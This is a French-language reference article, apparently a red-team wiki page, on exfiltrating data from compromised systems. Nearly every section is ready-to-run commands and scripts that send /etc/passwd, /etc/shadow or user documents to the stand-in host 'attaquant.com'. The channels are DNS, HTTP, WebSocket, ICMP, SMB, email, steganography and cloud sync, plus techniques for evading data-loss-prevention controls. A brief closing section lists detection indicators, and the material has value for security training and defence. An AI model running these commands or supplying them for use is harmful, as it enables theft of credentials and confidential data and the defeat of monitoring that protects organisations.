---
title: Data Exfiltration
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [exfiltration, data, dns, http, icmp, steganographie, sécurité, red-team]
date: 2026-03-22
---

# Data Exfiltration

L'exfiltration de données est le transfert non autorisé d'informations depuis un système compromis vers une infrastructure contrôlée par l'attaquant, en contournant les contrôles de sécurité (DLP, firewall, IDS).

## Exfiltration via DNS

Avantage : le DNS est rarement bloqué en sortie et peu surveillé. Les données sont encodées dans les noms de domaine.

```bash
# Principe : encoder les données en base32/64 et les envoyer comme sous-domaines
# attaquant.com a un serveur DNS qui logue toutes les requêtes

# Exfiltration manuelle d'un fichier
cat /etc/passwd | base64 | tr -d '\n' | fold -w 30 | while read chunk; do
    dig ${chunk}.attaquant.com
done
# → Chaque requête DNS logue "chunk.attaquant.com" sur le serveur attaquant

# dnscat2 — tunnel complet via DNS
# Côté serveur (attaquant)
ruby dnscat2.rb --dns "domain=tunnel.attaquant.com,host=0.0.0.0"

# Côté client (machine compromise)
./dnscat --dns server=8.8.8.8,domain=tunnel.attaquant.com
# → Shell interactif sur le serveur, tout passant par DNS

# iodine — tunnel IP via DNS
# Serveur
iodined -f 10.0.0.1 tunnel.attaquant.com

# Client
iodine -f 8.8.8.8 tunnel.attaquant.com
```

## Exfiltration via HTTP/HTTPS

```bash
# curl — envoyer un fichier
curl -X POST https://attaquant.com/collect \
    -F "file=@/etc/passwd" \
    -H "Authorization: Bearer TOKEN"

# wget
wget --post-file=/etc/shadow https://attaquant.com/collect

# PowerShell (Windows)
$data = [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\admin\Documents\sensitive.docx"))
Invoke-WebRequest -Uri "https://attaquant.com/collect" -Method POST -Body $data

# Via des requêtes GET (données dans l'URL — plus discret, court)
$secret = Get-Content "C:\secrets.txt" -Raw
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($secret))
Invoke-WebRequest "https://attaquant.com/?d=$b64"

# Steganographie HTTP — cacher dans les headers
curl -H "X-Session-ID: $(cat /etc/passwd | base64)" https://attaquant.com/

# Via WebSocket (moins filtré que HTTP dans certains environnements)
python3 -c "
import asyncio, websockets, base64

async def exfil():
    async with websockets.connect('wss://attaquant.com/ws') as ws:
        data = open('/etc/passwd').read()
        await ws.send(base64.b64encode(data.encode()).decode())

asyncio.run(exfil())
"
```

## Exfiltration via ICMP

```bash
# Ping avec des données dans le payload ICMP
# Taille max du payload : ~65507 octets mais généralement limité

# hping3 — ping avec payload personnalisé
hping3 --icmp --data 100 attaquant.com -e "$(cat /etc/passwd | head -5)"

# Ptunnel (tunnel via ICMP)
# Serveur
ptunnel -x password

# Client
ptunnel -p attaquant.com -lp 8888 -da localhost -dp 22 -x password
ssh -p 8888 root@localhost  # SSH via ICMP

# nping (Nmap)
nping --icmp -c 1 --data-string "$(cat /etc/passwd)" attaquant.com
```

## Exfiltration via SMB

```bash
# Si le port 445 est autorisé en sortie (rare mais possible)
# Impacket — serveur SMB attaquant
impacket-smbserver share /tmp/loot -smb2support

# Windows → copie vers le serveur SMB
net use Z: \\attaquant.com\share
copy C:\sensitive\*.docx Z:\
net use Z: /delete

# CrackMapExec
nxc smb attaquant.com -u guest -p "" --put-file C:\data.zip share
```

## Exfiltration par email (SMTP)

```bash
# PowerShell — envoyer par email
$attachment = "C:\Users\admin\Documents\secret.pdf"
$smtp = New-Object Net.Mail.SmtpClient("smtp.gmail.com", 587)
$smtp.EnableSsl = $true
$smtp.Credentials = New-Object Net.NetworkCredential("attaquant@gmail.com", "password")
$mail = New-Object Net.Mail.MailMessage
$mail.From = "victim@company.com"
$mail.To.Add("attaquant@gmail.com")
$mail.Attachments.Add($attachment)
$smtp.Send($mail)

# Python (si Python disponible sur la machine)
import smtplib
from email.mime.base import MIMEBase
from email import encoders
```

## Exfiltration par canaux cachés

### Steganographie de fichiers

```bash
# Cacher des données dans une image PNG
steghide embed -cf cover.jpg -sf secret.txt -p password
# Envoyer cover.jpg à l'extérieur (semble une image normale)

# Récupérer
steghide extract -sf cover.jpg -p password

# zsteg — cacher dans les bits de poids faible (LSB)
# Le fichier résultant est visiblement identique à l'original

# ExifTool — cacher dans les métadonnées
exiftool -Comment="$(cat /etc/passwd | base64)" photo.jpg
# Envoyer photo.jpg → lire depuis l'autre côté
exiftool -Comment photo.jpg | cut -d: -f2 | base64 -d
```

### Timing Channel

```bash
# Encoder des bits dans des délais entre paquets
# "0" = délai court, "1" = délai long → imperceptible sans monitoring précis
# Technique avancée utilisée par des malwares sophistiqués
```

## Contournement DLP (Data Loss Prevention)

```bash
# Fragmentation — diviser en petits morceaux
split -b 100k sensitive.tar.gz chunk_
# Envoyer chunk_aa, chunk_ab... séparément

# Chiffrement avant exfiltration
openssl enc -aes-256-cbc -in sensitive.tar.gz -out encrypted.bin -k password
# Envoyer encrypted.bin → indéchiffrable sans la clé

# Renommage d'extension (pour les DLP basés sur les types de fichiers)
mv sensitive.pdf photo.jpg
# (contournement basique → les DLP modernes vérifient les magic bytes)

# Fragmentation et encodage Base64
cat sensitive.pdf | base64 | split -l 1000 - chunk_
# Chaque chunk ressemble à du texte → peut passer des filtres de type de fichier

# Compression et obfuscation
tar czf - sensitive/ | openssl enc -aes-256-cbc -k secret | base64 | curl -s -X POST \
    "https://attaquant.com/upload" -d @-
```

## Exfiltration passive — accès externe pré-configuré

```bash
# Rclone — synchronisation vers le cloud (Dropbox, Google Drive, S3...)
# L'attaquant configure rclone avec ses credentials cloud
rclone copy /tmp/loot gdrive:backup/ --progress

# Mega — synchronisation
megacmd
mega-login attaquant@email.com password
mega-put /tmp/loot /backup/

# OneDrive / Sharepoint (via Microsoft 365 API)
# → Difficile à bloquer dans une entreprise Microsoft
```

## Détection

```
Indicateurs d'exfiltration DNS :
  - Requêtes DNS vers des domaines non catégorisés
  - Sous-domaines inhabituellement longs
  - Volume élevé de requêtes vers un même domaine
  - Requêtes TXT/NULL/MX inhabituelles

Indicateurs HTTP :
  - POST vers des IPs sans reverse DNS
  - User-Agent inhabituel
  - Gros volumes de données sortantes hors heures de travail
  - Connexions vers des IP de C2 connus (Threat Intelligence)

Détection générale :
  - DLP (Data Loss Prevention) avec classification des données
  - Analyse du trafic réseau (NetFlow, Zeek)
  - UEBA (User and Entity Behavior Analytics)
  - Monitoring des accès aux fichiers sensibles (auditd, Sysmon)
```
